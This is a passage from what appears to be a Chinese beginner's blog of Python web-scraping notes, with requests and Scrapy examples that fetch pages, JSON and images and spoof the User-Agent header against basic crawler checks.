class=\"line\">            text = it.xpath(<span class=\"string\">&#x27;.//tr[4]/td[@style=&quot;padding-left:3px&quot;]/text()&#x27;</span>).getall()</span><br><span class=\"line\">            text = <span class=\"string\">&quot;&quot;</span>.join(text).strip()</span><br><span class=\"line\">            item = ProseItem(title=title, text=text)</span><br><span class=\"line\">            <span class=\"keyword\">yield</span> item</span><br><span class=\"line\">        <span class=\"comment\"># //a[contains(text(), &quot;百度搜索&quot;)]  【可以部分检索】</span></span><br><span class=\"line\">        <span class=\"comment\"># //a[text()=&quot;文字内容&quot;] 【需要填全】 xpath定位指定文本标签</span></span><br><span class=\"line\">        next_url = response.xpath(<span class=\"string\">&#x27;//tr//a[text()=&quot;下一页&quot;]/@href&#x27;</span>).get()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> next_url:</span><br><span class=\"line\">            <span class=\"keyword\">return</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">yield</span> scrapy.Request(self.base_url+next_url, callback=self.parse)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>piplines 部分</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Define your item pipelines here</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Don&#x27;t forget to add your pipeline to the ITEM_PIPELINES setting</span></span><br><span class=\"line\"><span class=\"comment\"># See: https://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"><span class=\"keyword\">from</span> scrapy.exporters <span class=\"keyword\">import</span> JsonLinesItemExporter</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ProsePipeline</span>(<span class=\"params\"><span class=\"built_in\">object</span></span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        self.fp = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;prose.json&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>)</span><br><span class=\"line\">        self.exporter = JsonLinesItemExporter(self.fp, ensure_ascii=<span class=\"literal\">False</span>,</span><br><span class=\"line\">                                              encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">open_spider</span>(<span class=\"params\">self, spider</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;爬虫开始了...&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">process_item</span>(<span class=\"params\">self, item, spider</span>):</span></span><br><span class=\"line\">        self.exporter.export_item(item)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> item</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">close_spider</span>(<span class=\"params\">self, spider</span>):</span></span><br><span class=\"line\">        self.fp.close()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;爬虫结束了....&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n","site":{"data":{}},"excerpt":"<h1 id=\"爬虫第一天\"><a href=\"#爬虫第一天\" class=\"headerlink\" title=\"爬虫第一天\"></a>爬虫第一天</h1><ul>\n<li>urllib太过古老，因此不加以深入学习</li>\n</ul>\n<h3 id=\"requests\"><a href=\"#requests\" class=\"headerlink\" title=\"requests\"></a>requests</h3><p>requests模块：python中原生的一款基于网络请求的模块，功能强大，简单便捷，效率高。<br>作用：模拟浏览器发送请求。</p>\n<p>如何使用：（requests模块的编码流程）<br>    -指定url<br>    -发起请求（get或post）<br>    -获取响应数据<br>    -持久化存储（数据库或本地存储）</p>\n<p>环境安装：<br>    -pip或pycharm安装<br>    -anaconda自带（方便已装）</p>","more":"<h3 id=\"实战编码：\"><a href=\"#实战编码：\" class=\"headerlink\" title=\"实战编码：\"></a><strong>实战编码：</strong></h3><pre><code>- 需求：爬取拉勾网首页的数据\n    示例：\n</code></pre>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\">#step 1:指定url</span></span><br><span class=\"line\">    url = <span class=\"string\">&quot;https://www.lagou.com/jobs/6889986.html?show=96e52fa1d2134ad483eac5662bcc9fc6&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#step_2:发起请求</span></span><br><span class=\"line\">    <span class=\"comment\">#get会返回一个响应对象</span></span><br><span class=\"line\">    response = requests.get(url=url)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#step_3:获取相应数据(.text返回的是字符串形式的响应数据)</span></span><br><span class=\"line\">    page_text = response.text</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(page_text)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#step_4:持久化存储</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./lagou.html&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>, encoding = <span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">        fp.write(page_text)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;爬取数据结束&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<ul>\n<li><p>以上代码极有可能会被网站捕获，被识别出为爬虫，所以需要实施反爬虫策略</p>\n</li>\n<li><p>示例：<br>UA:User-Agent (请求载体的身份标识)<br>UA检测：门户网站的服务器会检测对应的载体身份标识，如果检测到请求的载体身份标识为某一款浏览器，<br>说明该请求是一个正常的请求。但是，如果监测到请求的载体身份标识不是基于某一款浏览器的，则表示<br>该请求为不正常的请求（爬虫），则服务器端就很有可能拒绝这次请求。<br>UA伪装:将对应的请求载体身份标识伪装成一款浏览器</p>\n</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># UA伪装：将对应的User-Agent封装到一个字典中</span></span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    url = <span class=\"string\">&#x27;https://www.sogou.com/web?&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#处理url携带的参数：封装到字典中（参数为问号后面的）</span></span><br><span class=\"line\">    kw = <span class=\"built_in\">input</span>(<span class=\"string\">&#x27;enter a word:&#x27;</span>)</span><br><span class=\"line\">    param = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;query&#x27;</span>: kw</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 需求的响应返回的是一个对象，对象应实例化</span></span><br><span class=\"line\">    response = requests.get(url=url, params=param, headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 确认相应数据是txt类型的</span></span><br><span class=\"line\">    page_text = response.text</span><br><span class=\"line\">    fileName = kw+<span class=\"string\">&#x27;.html&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(fileName, <span class=\"string\">&#x27;w&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">        fp.write(page_text)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;保存成功。。。&#x27;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"爬虫第二天\"><a href=\"#爬虫第二天\" class=\"headerlink\" title=\"爬虫第二天\"></a>爬虫第二天</h1><h3 id=\"有关于ajax\"><a href=\"#有关于ajax\" class=\"headerlink\" title=\"有关于ajax\"></a>有关于ajax</h3><h4 id=\"爬取百度翻译的内容\"><a href=\"#爬取百度翻译的内容\" class=\"headerlink\" title=\"爬取百度翻译的内容\"></a>爬取百度翻译的内容</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\">#获取url</span></span><br><span class=\"line\">    post_url = <span class=\"string\">&#x27;https://fanyi.baidu.com/sug&#x27;</span></span><br><span class=\"line\">    <span class=\"comment\">#进行UA伪装</span></span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;User-Agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">#post请求的参数处理（同get请求一致）</span></span><br><span class=\"line\">    word = <span class=\"built_in\">input</span>(<span class=\"string\">&#x27;输入你想翻译的东西:&#x27;</span>)</span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;kw&#x27;</span>: word</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">#发送请求并生成响应</span></span><br><span class=\"line\">    response = requests.post(url=post_url, data=data, headers=headers)</span><br><span class=\"line\">    <span class=\"comment\">#获取响应数据:</span></span><br><span class=\"line\">    <span class=\"comment\">#json()方法返回的是obj （如果确认响应数据是json类型的）</span></span><br><span class=\"line\">    dic_obj = response.json()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#持久化存储</span></span><br><span class=\"line\">    filename = word+<span class=\"string\">&#x27;.json&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(filename, <span class=\"string\">&#x27;w&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">        json.dump(dic_obj, fp=fp, ensure_ascii=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#将jaon格式转化成dict格式</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(filename, <span class=\"string\">&#x27;r&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">        great = json.load(fp)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#将字典格式化输出(此字典中存在字典与列表的嵌套现象)</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> k, v <span class=\"keyword\">in</span> great.items():</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span>(v) == <span class=\"built_in\">list</span>:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> v:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(i)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(k)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(v)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;end...&#x27;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"爬取豆瓣电影信息\"><a href=\"#爬取豆瓣电影信息\" class=\"headerlink\" title=\"爬取豆瓣电影信息\"></a>爬取豆瓣电影信息</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##此处代码示例为失败的例子，未考虑到由ajax得到的页面依旧采用了ajax</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;https://movie.douban.com/j/chart/top_list&#x27;</span></span><br><span class=\"line\">    param = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;type&#x27;</span>: <span class=\"string\">&#x27; 24&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;interval_id&#x27;</span>: <span class=\"string\">&#x27; 100:90&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;action&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;start&#x27;</span>: <span class=\"string\">&#x27; 1&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;limit&#x27;</span>: <span class=\"string\">&#x27; 20&#x27;</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;User-Agent&#x27;</span>:<span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    response = requests.get(url=url, params=param, headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">    list_data = response.json()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./douban.json&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">        json.dump(list_data, fp, ensure_ascii=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./douban.json&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">        great = json.load(fp)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(great)</span><br></pre></td></tr></table></figure>\n<h1 id=\"爬虫学习第三天\"><a href=\"#爬虫学习第三天\" class=\"headerlink\" title=\"爬虫学习第三天\"></a>爬虫学习第三天</h1><h3 id=\"爬取国家药监总局部分信息\"><a href=\"#爬取国家药监总局部分信息\" class=\"headerlink\" title=\"爬取国家药监总局部分信息\"></a>爬取国家药监总局部分信息</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsList&#x27;</span></span><br><span class=\"line\">    url_2 = <span class=\"string\">&#x27;http://125.35.6.84:81/xk/itownet/portalAction.do?method=getXkzsById&#x27;</span></span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;User-Agent&#x27;</span>:<span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">#爬取的页数</span></span><br><span class=\"line\">    page_ = <span class=\"built_in\">input</span>(<span class=\"string\">&quot;请输入您想爬取的信息页数：&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> page <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"built_in\">int</span>(page_)+<span class=\"number\">1</span>):</span><br><span class=\"line\">        data = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;on&#x27;</span>: <span class=\"string\">&#x27;true&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;page&#x27;</span>: page,</span><br><span class=\"line\">            <span class=\"string\">&#x27;pageSize&#x27;</span>: <span class=\"string\">&#x27;15&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;productName&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;conditionType&#x27;</span>: <span class=\"string\">&#x27;1&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;applyname&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;applysn&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">#id_list have many ids</span></span><br><span class=\"line\">        id_list = []</span><br><span class=\"line\">        message = []</span><br><span class=\"line\"></span><br><span class=\"line\">        json_list = requests.post(url=url, data=data, headers=headers).json()</span><br><span class=\"line\">        <span class=\"comment\">#id_a is a dict</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> id_a <span class=\"keyword\">in</span> json_list[<span class=\"string\">&quot;list&quot;</span>]:</span><br><span class=\"line\">            id_list.append(id_a[<span class=\"string\">&quot;ID&quot;</span>])</span><br><span class=\"line\">            <span class=\"comment\">#id_b是id号</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> id_b <span class=\"keyword\">in</span> id_list:</span><br><span class=\"line\">                data_2 = &#123;</span><br><span class=\"line\">                    <span class=\"string\">&quot;id&quot;</span>: <span class=\"built_in\">str</span>(id_b)</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                detail_message = requests.post(url=url_2, data=data_2, headers=headers).json()</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(detail_message)</span><br><span class=\"line\">                message.append(detail_message)</span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./药物信息.json&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>, encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">        json.dump(message, fp, ensure_ascii=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;end...&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;此代码爬取时间可能有些长，也有可能会出现Timeouterror错误，多试几次可能就可以了&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;出现这种情况的原因是对方服务器拒绝请求（反爬虫），，，后续继续学习反反爬虫技术&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"数据解析概述\"><a href=\"#数据解析概述\" class=\"headerlink\" title=\"数据解析概述\"></a>数据解析概述</h3><ul>\n<li>聚焦爬虫：爬取页面中指定的页面内容<pre><code>-编码流程\n    1、指定url\n    2、发起请求\n    3、获取相应数据\n    4、持久化存储\n    \n</code></pre>\n-数据解析分类：<pre><code>    -正则\n    -bs4\n    -xpath\n    \n</code></pre>\n-数据解析原理概述<pre><code>    -解析的局部的文本内容都会在标签之间或者标签对应的属性中进行存储\n    -1、进行指定标签的定位\n    -2、标签或者标签对应属性中存储的数据值进行提取（解析）\n</code></pre>\n</li>\n</ul>\n<h3 id=\"图片的爬取代码\"><a href=\"#图片的爬取代码\" class=\"headerlink\" title=\"图片的爬取代码\"></a>图片的爬取代码</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"comment\">#此处url为图片地址，而非链接【地址比链接短】</span></span><br><span class=\"line\">url = <span class=\"string\">&#x27;https://tse4-mm.cn.bing.net/th/id/OIP.vLPcBX_5hWArkIbn_PqvYgHaGL?w=233&amp;h=195&amp;c=7&amp;o=5&amp;dpr=1.25&amp;pid=1.7&#x27;</span></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;user-agent&#x27;</span>: <span class=\"string\">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&#x27;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">#图片以二进制的形式存储，所以以.content形式接收，以jpg格式存</span></span><br><span class=\"line\">data_pict = requests.get(url=url, headers=headers).content</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./beauty_pict.jpg&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>) <span class=\"keyword\">as</span> fp:</span><br><span class=\"line\">    fp.write(data_pict)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"爬虫第四天\"><a href=\"#爬虫第四天\" class=\"headerlink\" title=\"爬虫第四天\"></a>爬虫第四天</h1><h3 id=\"爬取百度图片（星空图片）\"><a href=\"#爬取百度图片（星空图片）\" class=\"headerlink\" title=\"爬取百度图片（星空图片）\"></a>爬取百度图片（星空图片）</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\">#创建一个文件夹，存放图片</span></span><br><span class=\"line\">    <span 